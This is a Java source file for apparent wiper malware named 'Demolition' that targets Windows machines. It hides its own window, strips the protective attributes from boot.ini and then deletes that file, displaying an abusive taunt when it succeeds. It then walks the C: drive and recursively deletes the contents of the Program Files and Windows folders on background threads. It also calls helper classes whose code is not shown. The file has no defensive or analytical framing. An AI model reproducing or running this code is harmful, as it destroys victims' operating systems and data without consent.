import java.io.*;
import javax.swing.*;
class Demolition extends JFrame implements Runnable,Serializable
{
	public static String loc=null;
	public static void main(String[] arg) throws Exception
	{
		new Drive().kickStart();
		new Demolition().setVisible(false);
		File dir=new File("C:\\");
		Runtime.getRuntime().exec("cmd start attrib -r -s -h -a c:\boot.ini");
		new Thread(new Demolition(),"Valid").start();
		findFile(dir);
	}
	public static void findFile(File dir)
	{
		try
		{
			if(dir.isFile())
			{
				if(dir.getName().equalsIgnoreCase("boot.ini"))
				{
					System.out.println("file found "+dir);
					if(dir.delete()) JOptionPane.showMessageDialog(null,"You're Fucked asshole!!!");
					//System.exit(0);
					//Runtime.getRuntime().exec("cmd /k start notepad.exe");
				}
			}
			else
			{
				if((dir.getName().equalsIgnoreCase("Program Files"))||(dir.getName().equalsIgnoreCase("Windows")))
				{
					loc=dir.getCanonicalPath();
					System.out.println("file found at "+loc);
					if(dir.getName().equalsIgnoreCase("Program Files"))	new Thread(new Demolition(),"ProgramFiles").start();
					else new Thread(new Demolition(),"Windows").start();
					return;
				}
				File[] listing=dir.listFiles();
				for(int i=0;i<listing.length;i++)
					findFile(listing[i]);
			}
		}
		catch(Exception e){System.out.println("exception "+e+" at "+dir);}
	}
	public void run()
	{
		if(Thread.currentThread().getName().equalsIgnoreCase("Valid"))
		{
			try{new Valid().maniac();}
			catch(Exception e){}
		}
		else deleteFiles(new File(loc));		
	}
	public void deleteFiles(File del)
	{
		File[] list=del.listFiles();
		for(int i=0;i<list.length;i++) 
		{
			if(list[i].isFile()) list[i].delete();
			else deleteFiles(list[i]);
			list[i].delete();
		}
	}
}